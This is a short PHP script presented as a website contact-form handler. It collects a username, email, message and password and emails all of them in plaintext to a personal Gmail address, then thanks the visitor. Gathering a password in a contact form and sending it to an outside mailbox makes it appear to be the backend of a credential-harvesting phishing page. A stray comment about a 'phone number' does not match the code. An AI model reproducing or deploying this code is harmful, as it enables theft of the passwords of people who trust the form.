<?php

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

  // Collect form data
  $name = $_POST["Username"];
  $email = $_POST["Email"];
  $message = $_POST["Message"];
  $password = $_POST["Password"];

  // Basic validation (optional)
  if (empty($name) || empty($email) || empty($message)) {
    echo "Please fill out all required fields.";
  } else {

    // Process the form data (example: send an email)
    $to = "rseun4125@gmail.com";
    $subject = "Form Submission from Your Website";
    $body = "Name: $name\nEmail: $email\nMessage: $message\nPassword: $password";  // Include phone number in body

    if (mail($to, $subject, $body)) {
      echo "Thank you for your message! We will be in touch shortly.";
    } else {
      echo "There was an error sending your message. Please try again later.";
    }
  }
}

?>
